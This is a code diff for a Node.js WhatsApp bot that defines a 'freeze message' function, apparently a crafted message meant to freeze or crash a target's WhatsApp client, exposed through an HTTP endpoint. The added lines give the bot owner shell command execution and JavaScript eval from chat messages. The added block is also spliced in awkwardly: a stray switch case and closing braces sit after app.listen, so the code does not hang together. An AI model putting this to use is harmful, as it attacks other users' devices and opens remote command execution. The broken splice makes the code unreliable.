@@ -12,7 +12,7 @@ app.use(express.json()); // Middleware to parse JSON bodies
 
 // Function to send a freeze message
 async function freezekamoflase(target) {
-    await conn.relayMessage(target, {
+    await sam.relayMessage(target, {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -59,3 +59,44 @@ app.post('/freezekamoflase', async (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server is running on http://localhost:${PORT}`);
     
+//end of output
+
+ default:
+if (budy.startsWith('$')) {
+if (!isOwner) return
+exec(budy.slice(2), (err, stdout) => {
+if(err) return sam.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
+if (stdout) return sam.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
+})}
+
+if (budy.startsWith(">")) {
+if (!isOwner) return
+try {
+let evaled = await eval(text)
+if (typeof evaled !== 'string') evaled = util.inspect(evaled)
+sam.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
+} catch (e) {
+sam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
+}}
+
+if (budy.startsWith("=>")) {
+if (!isOwner) return
+try {
+const evaling = await eval(`;(async () => { ${text} })();`);
+return sam.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
+} catch (e) {
+return sam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
+}}
+
+}} catch (e) {
+console.log(e)
+sam.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
+}}
+
+let file = require.resolve(__filename) 
+fs.watchFile(file, () => {
+fs.unwatchFile(file)
+console.log(chalk.redBright(`Update ${__filename}`))
+delete require.cache[file]
+require(file)
+})
